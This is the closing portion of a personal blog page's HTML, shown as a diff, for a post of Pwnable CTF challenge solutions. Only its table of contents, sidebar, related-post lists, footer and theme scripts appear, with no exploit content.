href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-16"><span class="toc-number">6.9.2.</span> <span class="toc-text"> 题目解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#memcpy"><span class="toc-number">6.10.</span> <span class="toc-text"> memcpy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-17"><span class="toc-number">6.10.1.</span> <span class="toc-text"> 题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-17"><span class="toc-number">6.10.2.</span> <span class="toc-text"> 题目解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#memcpyprowl~-nc-0-9022hey-i-have-a-boring-assignment-for-cs-class-the-assignment-is-simple"><span class="toc-number">6.11.</span> <span class="toc-text"> memcpy@prowl:~$ nc 0 9022
+Hey, I have a boring assignment for CS class… 😦
+The assignment is simple.</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#asm"><span class="toc-number">6.12.</span> <span class="toc-text"> asm</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-18"><span class="toc-number">6.12.1.</span> <span class="toc-text"> 题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-18"><span class="toc-number">6.12.2.</span> <span class="toc-text"> 题目解析</span></a></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/CTF/ISCC%E4%B8%80%E6%97%A5%E6%B8%B8/" rel="bookmark" title="ISCC一日游">ISCC一日游</a></li><li><a href="/CTF/%E9%A6%96%E5%B1%8ABilibili%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B/" rel="bookmark" title="首届Bilibili安全挑战赛">首届Bilibili安全挑战赛</a></li><li class="active"><a href="/CTF/Pwnable%E9%A2%98%E8%A7%A3/" rel="bookmark" title="Pwnable题解">Pwnable题解</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="a1oyss"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">a1oyss</p>
+  <div class="description" itemprop="description">随便写点什么</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">14</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">5</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">15</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Exb3lzcw==" title="https:&#x2F;&#x2F;github.com&#x2F;a1oyss"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/%E6%9D%82%E8%AE%B0/VScode+XDebug%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95ThinkPHP%20RCE/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/BUG/Hexo%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E5%A4%B1%E8%B4%A5/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/CTF/Pwnable%E9%A2%98%E8%A7%A3/" title="Pwnable题解">Pwnable题解</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%9D%82%E8%AE%B0/" title="分类于 杂记">杂记</a>
+</div>
+
+    <span><a href="/%E6%9D%82%E8%AE%B0/VScode+XDebug%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95ThinkPHP%20RCE/" title="VScode+XDebug远程调试ThinkPHP RCE">VScode+XDebug远程调试ThinkPHP RCE</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%9D%82%E8%AE%B0/" title="分类于 杂记">杂记</a>
+</div>
+
+    <span><a href="/%E6%9D%82%E8%AE%B0/Terminal%E5%AE%89%E8%A3%85+%E7%BE%8E%E5%8C%96/" title="Terminal安装+美化">Terminal安装+美化</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%9D%82%E8%AE%B0/" title="分类于 杂记">杂记</a>
+</div>
+
+    <span><a href="/%E6%9D%82%E8%AE%B0/Pycharm+VMware%E6%90%AD%E5%BB%BALinux%E4%B8%8B%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/" title="Pycharm+VMware搭建Linux下开发环境">Pycharm+VMware搭建Linux下开发环境</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/CTF/%E9%A6%96%E5%B1%8ABilibili%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B/" title="首届Bilibili安全挑战赛">首届Bilibili安全挑战赛</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/CTF/ISCC%E4%B8%80%E6%97%A5%E6%B8%B8/" title="ISCC一日游">ISCC一日游</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/BUG/" title="分类于 BUG">BUG</a>
+</div>
+
+    <span><a href="/BUG/%E8%BF%90%E8%A1%8CCMD%E6%8F%90%E7%A4%BA%5B%E5%B7%B2%E9%80%80%E5%87%BA%E8%BF%9B%E7%A8%8B%EF%BC%8C%E4%BB%A3%E7%A0%81%E4%B8%BA%201%5D%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/" title="运行CMD提示[已退出进程，代码为 1]解决方案">运行CMD提示[已退出进程，代码为 1]解决方案</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E7%AC%94%E8%AE%B0/" title="分类于 笔记">笔记</a>
+</div>
+
+    <span><a href="/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/" title="设计模式-单例模式">设计模式-单例模式</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E7%AC%94%E8%AE%B0/" title="分类于 笔记">笔记</a>
+</div>
+
+    <span><a href="/%E7%AC%94%E8%AE%B0/SSM%E6%A1%86%E6%9E%B6%E6%95%B4%E5%90%88%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E5%8A%A0%E8%BD%BD%E5%8E%9F%E7%90%86%E7%9A%84%E6%80%9D%E8%80%83/" title="SSM框架整合过程以及加载原理的思考">SSM框架整合过程以及加载原理的思考</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%9D%82%E8%AE%B0/" title="分类于 杂记">杂记</a>
+</div>
+
+    <span><a href="/%E6%9D%82%E8%AE%B0/CTFd+CTFd-Whale%E9%83%A8%E7%BD%B2%E5%AE%9E%E8%B7%B5/" title="CTFd+CTFd-Whale部署实践">CTFd+CTFd-Whale部署实践</a></span>
+  </li>
+
+  </ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2022</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">a1oyss @ a1oyss's blog</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: 'CTF/Pwnable题解/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
